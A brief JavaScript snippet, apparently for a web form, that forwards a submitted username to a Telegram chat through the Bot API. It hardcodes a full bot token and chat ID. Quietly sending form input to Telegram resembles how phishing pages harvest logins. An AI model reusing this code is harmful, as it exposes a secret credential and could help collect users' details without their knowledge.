const form = document.querySelector('#reporma')

form.addEventListener("submit", (e) => { 
e.preventDefault()

var text = document.querySelector("#pangalan").value

var token = "6936378040:AAGAdvzQYo6502inGljvgYKSa04-VDQPvTk"

var chat_id = "-4199551303"

var my_text = `my username is ${text}`

var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}& 
text=${my_text}`

let api = new XMLHttpRequest()
api.open("GET", url, true)
api.send()

text.value = ""
})